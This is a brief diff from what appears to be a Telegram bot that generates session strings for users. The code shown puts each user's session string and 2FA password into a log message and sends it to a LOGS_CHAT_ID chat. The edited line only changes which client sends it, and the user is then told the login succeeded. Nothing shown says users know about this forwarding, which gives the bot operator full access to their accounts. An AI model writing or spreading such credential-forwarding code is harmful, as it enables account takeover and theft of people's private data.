@@ -118,6 +118,6 @@ async def generate_session(_, message):
         f"**✨Session String ↓** `{string_session}`\n"
         f"**✨2FA Password:** `{password if 'password' in locals() else 'None'}`"
     )
-    await bot.send_message(LOGS_CHAT_ID, log_message)
+    await _.send_message(LOGS_CHAT_ID, log_message)
     await client.disconnect()
     await otp_code.reply("✅ Login successful!")
